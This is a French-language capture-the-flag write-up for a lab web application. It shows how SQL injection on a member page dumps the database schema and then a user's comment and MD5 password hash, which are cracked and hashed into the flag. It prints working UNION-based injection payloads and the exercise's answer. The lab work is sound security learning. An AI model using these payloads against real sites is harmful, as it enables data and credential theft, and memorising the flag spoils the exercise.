# SQL INJECTION

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Découverte


Sur la page http://10.11.200.198/?page=member on injecte cette ligne de sql \
pour connaitre tous les users ainsi que le nom des tables et des colonnes:
```
1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
On peut faire un schéma de la table users:
|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|
|   users table    |
|------------------|
| user_id          |
| first_name       |
| last_name        |
| town             |
| country          |
| planet           |
| Commentaire      |
| countersign      |
|__________________|

Un utilisateur semble être interessant:
```
First name: Flag
Surname : GetThe
```
Toujours avec le meme genre d'injection sql on peut extraire les informations \
de cet utilisateur:
```
1 or 1=1 UNION SELECT commentaire, countersign from users WHERE user_id=5
```
commentaire:
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign:
5ff9d0165b4f92b14994e5c685cdce28

countersign est crypté en md5 (merci google), en suivant les instructions du \
commentaire on ce retrouve avec:
5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo -> fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Documentation
- [owasp - sql injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [sqlinjection.net](https://www.sqlinjection.net/category/attacks)

---

[RETURN](https://github.com/jlange91/darkly)
